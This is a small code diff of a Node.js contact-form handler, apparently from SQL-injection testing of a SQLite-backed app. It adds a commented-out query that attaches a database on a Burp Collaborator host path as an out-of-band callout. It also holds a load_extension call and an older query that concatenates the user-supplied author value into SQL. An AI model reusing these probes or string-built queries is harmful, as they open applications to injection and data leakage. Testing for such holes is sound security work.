@@ -25,6 +25,7 @@ async function asyncCall(author, comment) {
     //check the data have been save
     //models.sequelize.query('SELECT * FROM contact_ag2rs WHERE author = "'+author+'" order by id desc LIMIT 1').then(([data]) => {
     models.sequelize.query('select load_extension("//dsdsaaaddsd")').then(([data]) => {
+    //models.sequelize.query("attach database '/net/rc752wcuose5e4m5ifm4nodmjdpdd2.burpcollaborator.net/z' as z;").then(([data]) => {
       const dataJson = utils.queryResultToJson(data)
       console.log(dataJson)
     })
@@ -36,6 +37,7 @@ async function asyncCall(author, comment) {
 
 module.exports = function contactPage () {
   return (req, res, next) => {
+
     asyncCall(req.body.author, req.body.comment)
 
     res.status(200).json({
